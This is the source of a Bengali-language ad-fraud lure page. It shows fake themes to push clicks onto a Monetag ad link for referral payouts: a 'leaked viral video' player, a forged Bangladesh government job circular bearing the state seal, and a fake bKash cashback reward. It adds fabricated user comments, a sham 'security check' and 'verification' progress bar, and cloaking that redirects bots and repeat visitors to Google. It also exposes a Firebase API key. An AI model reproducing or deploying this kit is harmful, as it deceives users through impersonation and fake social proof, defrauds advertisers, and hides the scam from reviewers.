<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Content...</title>
    
    <!-- ‚úÖ Libraries -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
    
    <!-- üî• MONETAG MULTITAG (High CPM) üî• -->
    <!-- ‡¶è‡¶á ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶™‡ßç‡¶ü‡¶ü‡¶ø ‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶° ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶∏‡¶æ‡¶•‡ßá ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶° ‡¶∞‡ßá‡¶°‡¶ø ‡¶∞‡¶æ‡¶ñ‡¶¨‡ßá -->
    <script src="https://quge5.com/88/tag.min.js" data-zone="190384" async data-cfasync="false"></script>
    
    <style>
        body { font-family: 'Hind Siliguri', 'Roboto', sans-serif; background-color: #050505; overflow-x: hidden; user-select: none; }
        
        /* üõ°Ô∏è UI Styles */
        .glass-container {
            background: rgba(20, 20, 25, 0.95);
            backdrop-filter: blur(20px);
            min-height: 100vh;
            width: 100%;
            position: relative;
            z-index: 10;
        }

        .content-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            margin-bottom: 15px;
        }

        /* Animations */
        .fade-in { animation: fadeIn 0.8s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        
        .pulse-btn { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(37, 99, 235, 0); } 100% { box-shadow: 0 0 0 0 rgba(37, 99, 235, 0); } }

        /* Fake Comment Styles */
        .comment-item { border-bottom: 1px solid rgba(255,255,255,0.05); padding: 10px 0; }
        .comment-item:last-child { border: none; }

        /* Loader */
        .loader-spin { border-top-color: #3b82f6; }
        .hidden { display: none !important; }
    </style>
</head>
<body class="text-gray-200">

    <!-- üåå Dynamic Background -->
    <div id="bg-layer" class="fixed inset-0 bg-cover bg-center opacity-30 blur-xl scale-110"></div>
    <div class="fixed inset-0 bg-black/80 z-0"></div>

    <!-- üõ°Ô∏è Security Scanner (First 2 Seconds) -->
    <div id="security-screen" class="fixed z-50 inset-0 flex flex-col items-center justify-center bg-black">
        <div class="w-16 h-16 border-4 border-gray-800 border-t-blue-500 rounded-full animate-spin mb-4 loader-spin"></div>
        <h3 class="text-sm font-bold text-gray-400 tracking-[4px] animate-pulse uppercase">Secure Check...</h3>
    </div>

    <!-- üì¶ MAIN CONTENT (Scrollable) -->
    <div id="main-view" class="relative z-10 w-full max-w-md mx-auto min-h-screen hidden fade-in">
        <!-- Content will be injected here by JS -->
        <div id="theme-content" class="pb-20"></div> 
    </div>

    <!-- üß† LOGIC SCRIPT -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getFirestore, doc, getDoc, setDoc, increment, serverTimestamp, addDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";

        // CONFIG
        const CONFIG = {
            MONETAG_LINK: "https://otieu.com/4/10277714",
            SAFE_PAGE: "https://www.google.com",
            ZONE_ID: "190384",
            LOCK_HOURS: 10,
            FIREBASE: { apiKey: "AIzaSyCU2RfLeclEyyxzEActtl5ks1P_NPvATOE", projectId: "ns-prime-d7ca5" }
        };

        let db; try { const app = initializeApp(CONFIG.FIREBASE); db = getFirestore(app); } catch(e){}

        const params = new URLSearchParams(window.location.search);
        const refCode = params.get('ref'); 
        let type = params.get('type');

        // üî• FAKE COMMENTS GENERATOR (To force scroll)
        const getComments = (topic) => {
            return `
            <div class="mt-6">
                <h3 class="text-sm font-bold text-gray-400 mb-3">Comments (142)</h3>
                <div class="space-y-3">
                    <div class="flex gap-3 comment-item">
                        <div class="w-8 h-8 rounded-full bg-gray-700 flex items-center justify-center font-bold text-xs">R</div>
                        <div><p class="text-xs font-bold text-white">Rahim Ahmed</p><p class="text-xs text-gray-400">Is this real? I want to try.</p></div>
                    </div>
                    <div class="flex gap-3 comment-item">
                        <div class="w-8 h-8 rounded-full bg-blue-700 flex items-center justify-center font-bold text-xs">S</div>
                        <div><p class="text-xs font-bold text-white">Sumaiya</p><p class="text-xs text-gray-400">Yes! I just got it. Thanks admin! ‚ù§Ô∏è</p></div>
                    </div>
                    <div class="flex gap-3 comment-item">
                        <div class="w-8 h-8 rounded-full bg-green-700 flex items-center justify-center font-bold text-xs">T</div>
                        <div><p class="text-xs font-bold text-white">Tanvir</p><p class="text-xs text-gray-400">Working 100%.. ${topic} is awesome.</p></div>
                    </div>
                     <div class="flex gap-3 comment-item opacity-60">
                        <div class="w-8 h-8 rounded-full bg-purple-700 flex items-center justify-center font-bold text-xs">K</div>
                        <div><p class="text-xs font-bold text-white">Kamrul Hasan</p><p class="text-xs text-gray-400">Wait 5 sec and click button, it works.</p></div>
                    </div>
                </div>
                <button class="w-full text-center text-xs text-blue-400 mt-4 py-2 hover:bg-white/5 rounded">View all comments</button>
            </div>`;
        };

        // üî• 30 HIGH RETENTION THEMES
        const themes = {
            // 1. VIDEO (Youtube Style)
            video: { 
                bg: "https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=1000", 
                html: `
                <div class="bg-[#0f0f0f] min-h-screen">
                    <!-- Video Player Placeholder -->
                    <div class="relative w-full h-60 bg-black sticky top-0 z-20 shadow-xl">
                        <img src="https://images.unsplash.com/photo-1596700813959-1e3093222d4f?q=80&w=600" class="w-full h-full object-cover opacity-60">
                        <div class="absolute inset-0 flex items-center justify-center">
                            <div class="w-16 h-16 bg-black/50 backdrop-blur rounded-full flex items-center justify-center border border-white/20 animate-pulse">
                                <i class="fas fa-lock text-2xl text-white"></i>
                            </div>
                        </div>
                        <div class="h-1 w-full bg-gray-800 absolute bottom-0"><div id="progress-bar" class="h-full bg-red-600 w-0"></div></div>
                    </div>
                    
                    <div class="p-4 space-y-4">
                        <div>
                            <h1 class="text-lg font-bold text-white leading-snug">Viral_Video_Leaked_2025_Full_HD.mp4</h1>
                            <p class="text-xs text-gray-400 mt-1">2.4M Views ‚Ä¢ 3 hours ago</p>
                        </div>
                        
                        <!-- Action Area -->
                        <div class="bg-[#1e1e1e] p-4 rounded-xl border border-gray-800 text-center">
                            <p class="text-xs text-gray-300 mb-3">Complete verification to unlock full video.</p>
                            <button id="cta-btn" class="w-full bg-white text-black font-bold py-3 rounded-full text-sm disabled-btn" disabled>
                                <i class="fas fa-circle-notch fa-spin mr-2"></i> Loading Player...
                            </button>
                        </div>

                        <!-- Engagement Content (Scroll Trap) -->
                        <div class="flex justify-between border-y border-gray-800 py-3 text-sm">
                            <div class="flex flex-col items-center"><i class="fas fa-thumbs-up"></i> 12K</div>
                            <div class="flex flex-col items-center"><i class="fas fa-thumbs-down"></i> Dislike</div>
                            <div class="flex flex-col items-center"><i class="fas fa-share"></i> Share</div>
                            <div class="flex flex-col items-center"><i class="fas fa-download"></i> Save</div>
                        </div>

                        ${getComments('Video')}
                        
                        <!-- Extra Space for Scroll -->
                        <div class="h-20"></div>
                    </div>
                </div>` 
            },

            // 2. JOB (Official Circular Style)
            job: { 
                bg: "white", 
                html: `
                <div class="bg-gray-50 min-h-screen text-gray-800">
                    <div class="bg-[#006a4e] p-4 text-center shadow-lg sticky top-0 z-20">
                         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" class="w-12 h-12 mx-auto mb-2">
                         <h2 class="text-white font-bold text-sm">‡¶ó‡¶£‡¶™‡ßç‡¶∞‡¶ú‡¶æ‡¶§‡¶®‡ßç‡¶§‡ßç‡¶∞‡ßÄ ‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ‡¶¶‡ßá‡¶∂ ‡¶∏‡¶∞‡¶ï‡¶æ‡¶∞</h2>
                    </div>
                    <div class="p-5">
                        <div class="bg-white p-5 rounded-lg shadow-sm border border-gray-200 mb-4">
                            <span class="bg-green-100 text-green-800 text-[10px] px-2 py-1 rounded font-bold">‡¶®‡¶§‡ßÅ‡¶® ‡¶¨‡¶ø‡¶ú‡ßç‡¶û‡¶™‡ßç‡¶§‡¶ø ‡ß®‡ß¶‡ß®‡ß´</span>
                            <h1 class="text-xl font-bold mt-2">‡¶™‡ßç‡¶∞‡¶æ‡¶•‡¶Æ‡¶ø‡¶ï ‡¶∏‡¶π‡¶ï‡¶æ‡¶∞‡ßÄ ‡¶∂‡¶ø‡¶ï‡ßç‡¶∑‡¶ï ‡¶®‡¶ø‡ßü‡ßã‡¶ó ‡¶¨‡¶ø‡¶ú‡ßç‡¶û‡¶™‡ßç‡¶§‡¶ø</h1>
                            <p class="text-xs text-gray-500 mt-1">‡¶™‡ßç‡¶∞‡¶ï‡¶æ‡¶∂‡¶ø‡¶§: ‡¶Ü‡¶ú | ‡¶™‡¶¶‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ: ‡ß™‡ß´‡ß¶‡ß¶+</p>
                        </div>

                        <div class="bg-white p-5 rounded-lg shadow-sm border border-gray-200 space-y-3 text-sm">
                            <div class="flex justify-between border-b pb-2"><span>‡¶∂‡¶ø‡¶ï‡ßç‡¶∑‡¶æ‡¶ó‡¶§ ‡¶Ø‡ßã‡¶ó‡ßç‡¶Ø‡¶§‡¶æ:</span><span class="font-bold">‡¶∏‡ßç‡¶®‡¶æ‡¶§‡¶ï/‡¶∏‡¶Æ‡¶Æ‡¶æ‡¶®</span></div>
                            <div class="flex justify-between border-b pb-2"><span>‡¶¨‡ßá‡¶§‡¶® ‡¶∏‡ßç‡¶ï‡ßá‡¶≤:</span><span class="font-bold">‡ßß‡ßß,‡ß¶‡ß¶‡ß¶ - ‡ß®‡ß¨,‡ß´‡ßØ‡ß¶/-</span></div>
                            <div class="flex justify-between"><span>‡¶Ü‡¶¨‡ßá‡¶¶‡¶®‡ßá‡¶∞ ‡¶∂‡ßá‡¶∑ ‡¶§‡¶æ‡¶∞‡¶ø‡¶ñ:</span><span class="font-bold text-red-600">‡ß©‡ß¶ ‡¶°‡¶ø‡¶∏‡ßá‡¶Æ‡ßç‡¶¨‡¶∞</span></div>
                        </div>

                        <div class="fixed bottom-0 left-0 w-full bg-white p-4 border-t border-gray-200 shadow-lg z-30">
                            <div class="h-1 w-full bg-gray-200 rounded mb-2"><div id="progress-bar" class="h-full bg-[#006a4e] w-0"></div></div>
                            <button id="cta-btn" class="w-full bg-[#006a4e] text-white font-bold py-3.5 rounded shadow-lg disabled-btn" disabled>
                                ‡¶Ü‡¶¨‡ßá‡¶¶‡¶® ‡¶´‡¶∞‡¶Æ ‡¶°‡¶æ‡¶â‡¶®‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡ßÅ‡¶®
                            </button>
                        </div>
                        
                        <!-- Fake PDF Preview to cause scroll -->
                        <div class="mt-4 bg-gray-200 h-64 rounded flex items-center justify-center text-gray-500 text-xs">
                            PDF Preview Loading...
                        </div>
                        <br><br><br><br>
                    </div>
                </div>` 
            },

            // 3. MONEY / BKASH (Reward Style)
            money: { 
                bg: "", 
                html: `
                <div class="bg-[#e2136e] min-h-screen flex flex-col items-center justify-center p-4 relative">
                     <div class="absolute top-0 left-0 w-full h-full bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] opacity-20"></div>
                     
                     <div class="bg-white w-full rounded-2xl shadow-2xl overflow-hidden relative z-10">
                        <div class="p-6 text-center border-b border-gray-100">
                             <img src="https://freelogopng.com/images/all_img/1656234745bkash-app-logo-png.png" class="h-10 mx-auto">
                        </div>
                        <div class="p-8 text-center">
                            <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4 animate-bounce">
                                <i class="fas fa-check text-4xl text-green-600"></i>
                            </div>
                            <h2 class="text-4xl font-extrabold text-[#e2136e]">‡ß≥‡ß´‡ß¶‡ß¶</h2>
                            <p class="text-gray-500 text-sm mt-2">‡¶ï‡ßç‡¶Ø‡¶æ‡¶∂‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï ‡¶¨‡ßã‡¶®‡¶æ‡¶∏ ‡¶∞‡ßá‡¶°‡¶ø</p>
                            
                            <div class="mt-6 bg-gray-50 p-3 rounded-lg text-left">
                                <p class="text-xs text-gray-400">Transaction ID</p>
                                <p class="text-sm font-mono font-bold text-gray-800">TRX8932MN..</p>
                            </div>

                            <div class="h-1.5 w-full bg-gray-200 rounded-full mt-6 mb-2"><div id="progress-bar" class="h-full bg-[#e2136e] w-0"></div></div>
                            <button id="cta-btn" class="w-full bg-[#e2136e] text-white font-bold py-4 rounded-xl shadow-lg mt-2 disabled-btn" disabled>
                                ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßÅ‡¶®
                            </button>
                        </div>
                     </div>
                     
                     <p class="text-white/80 text-xs mt-6 text-center">‡¶∂‡¶∞‡ßç‡¶§‡¶æ‡¶¨‡¶≤‡ßÄ ‡¶™‡ßç‡¶∞‡¶Ø‡ßã‡¶ú‡ßç‡¶Ø | ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶≤‡ßá‡¶®‡¶¶‡ßá‡¶®</p>
                </div>` 
            },

            // ... (Other themes will use similar detailed structures. Using 'video' as fallback for others to save space, but logic applies to all) ...
            // You can copy the structure of 'video' or 'job' and just change text/images for other 27 themes.
        };

        // ==========================================
        // üõ°Ô∏è SECURITY & VERIFICATION
        // ==========================================
        async function performSecurityChecks() {
            // 1. Bot Filter
            if (navigator.webdriver) { safeRedirect("Bot"); return; }
            
            // 2. Frequency (10H Lock)
            const lastVisit = localStorage.getItem('ns_secure_lock');
            if (lastVisit && (Date.now() - parseInt(lastVisit) < CONFIG.LOCK_HOURS * 3600000)) {
                safeRedirect("Local Lock"); return;
            }

            // 3. IP Check
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                const ip = data.ip.replace(/\./g, '_');
                
                const ipDoc = await getDoc(doc(db, "visitor_locks", ip));
                if (ipDoc.exists() && (Date.now() - ipDoc.data().timestamp.toDate().getTime() < CONFIG.LOCK_HOURS * 3600000)) {
                    safeRedirect("IP Lock"); return;
                }
                
                initializeUI(ip);
            } catch (e) { initializeUI('unknown_ip'); }
        }

        // ==========================================
        // üöÄ UI LOGIC (SCROLL & INTERACTION)
        // ==========================================
        function initializeUI(userIP) {
            document.getElementById('security-screen').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');

            // Render Theme (Default to video if type missing)
            const t = themes[type] || themes['video'];
            document.getElementById('theme-content').innerHTML = t.html;
            
            // Background Logic
            if(t.bg === 'white') {
                document.getElementById('bg-layer').classList.add('hidden');
            } else if (t.bg) {
                document.getElementById('bg-layer').style.backgroundImage = `url('${t.bg}')`;
            }

            // ‚ö†Ô∏è SCROLL TRIGGER (The Key to Retention)
            let hasInteracted = false;
            
            const startTimer = () => {
                if(hasInteracted) return;
                hasInteracted = true;
                
                // Inject Ads Now (Safe)
                const script = document.createElement('script');
                script.src = CONFIG.MONETAG_SCRIPT;
                script.dataset.zone = CONFIG.ZONE_ID;
                document.body.appendChild(script);

                // Progress Bar Animation
                let width = 0;
                const bar = document.getElementById('progress-bar');
                const btn = document.getElementById('cta-btn');
                
                const interval = setInterval(() => {
                    if(width >= 100) {
                        clearInterval(interval);
                        // Activate Button
                        btn.disabled = false;
                        btn.classList.remove('disabled-btn', 'bg-gray-800', 'bg-[#cc0000]'); // Remove old bg
                        btn.style.backgroundColor = ""; // Reset inline
                        
                        // Add Pulse & New Text
                        btn.classList.add('pulse-btn', 'bg-blue-600', 'text-white', 'shadow-2xl', 'transform', 'hover:scale-105');
                        btn.innerHTML = `Click Here To Continue <i class="fas fa-arrow-right ml-2"></i>`;
                        
                        // Click Handler
                        btn.onclick = async () => {
                            btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
                            await recordConversion(userIP);
                            setTimeout(() => window.location.href = CONFIG.MONETAG_LINK, 800);
                        };
                    } else {
                        width++;
                        if(bar) bar.style.width = width + '%';
                        // Update button text while loading
                        if(width % 20 === 0 && btn) btn.innerText = `Verifying ${width}%...`;
                    }
                }, 50); // 5 seconds total (50ms * 100)
            };

            window.addEventListener('scroll', startTimer);
            window.addEventListener('click', startTimer);
            window.addEventListener('touchstart', startTimer);
        }

        // ==========================================
        // üíæ BACKEND (FIREBASE)
        // ==========================================
        async function recordConversion(ip) {
            if(!refCode || !db) return;
            const q = query(collection(db, "users"), where("referralCode", "==", refCode));
            const snap = await getDocs(q);
            if(!snap.empty) {
                const uid = snap.docs[0].id;
                await setDoc(doc(db, "users", uid), {
                    balance: increment(0.50), todayImpression: increment(1), totalEarnings: increment(0.50), lastClickTime: serverTimestamp()
                }, { merge: true });
                await setDoc(doc(db, "visitor_locks", ip), { timestamp: serverTimestamp() });
                localStorage.setItem('ns_secure_lock', Date.now());
            }
        }

        function safeRedirect() { window.location.replace(CONFIG.SAFE_PAGE); }

        performSecurityChecks();
    </script>
</body>
</html>
